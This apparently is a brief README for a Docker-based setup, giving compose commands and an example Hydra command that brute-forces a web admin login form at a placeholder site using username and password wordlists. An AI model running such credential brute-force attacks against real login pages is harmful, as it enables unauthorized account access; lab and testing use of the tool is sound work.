- First time use: `docker-compose up --build`
- Afterward, use `docker-compose up`

Hydra reference: https://github.com/gnebbia/hydra_notes
- E.g., `hydra -L ./wordlists/usernames/multiple_sources_users.txt -P ./wordlists/passwords/most_used_passwords.txt -v "https-post-form://some_website.com/admin/login/?next=/admin:username=^USER^&password=^PASS^:F=failed to login"`

